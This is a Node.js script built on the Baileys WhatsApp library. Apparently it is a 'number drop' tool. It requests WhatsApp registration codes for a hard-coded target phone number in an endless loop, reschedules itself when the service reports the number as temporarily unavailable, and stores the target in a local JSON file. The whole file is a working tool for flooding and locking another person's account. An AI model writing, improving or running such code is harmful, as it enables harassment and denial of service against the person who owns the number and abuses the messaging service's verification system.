const prompt = require('prompt-sync')();
const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs')


const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

const numbers = JSON.parse(fs.readFileSync('./files/T.json'));

const start = async () => {

  const { state, saveCreds } = await useMultiFileAuthState('.mm')

  const spam = makeWaSocket({
    auth: state,
    mobile: true,
    logger: pino({ level: 'silent' })
  })
  console.clear();
  const dropNumber = async (context) => {
    const { phoneNumber, ddi, number } = context;
    while (true) {
      try {
        res = await spam.requestRegistrationCode({
          phoneNumber: '+' + phoneNumber,
          phoneNumberCountryCode: ddi,
          phoneNumberNationalNumber: number,
          phoneNumberMobileCountryCode: 666
        })
        b = (res.reason === 'temporarily_unavailable');
        if (b) {
          console.log(gradient('red', 'red')(`+${res.login}@s.whatsapp.net`));
          setTimeout(async () => {
            dropNumber(context)
          }, res.retry_after * 10)
          return;
        }
      } catch (error) {
        console.log(error)
      }
    }

  }
  console.log(gradient('red', 'red')('Script WhatsApp.'))
  let ddi = `62`
  let number = `85397604993`
  let phoneNumber = ddi + number;
  numbers[phoneNumber] = { ddi, number }
  fs.writeFileSync('./files/T.json', JSON.stringify(numbers, null, '\t'));
  dropNumber({ phoneNumber, ddi, number })

}
start();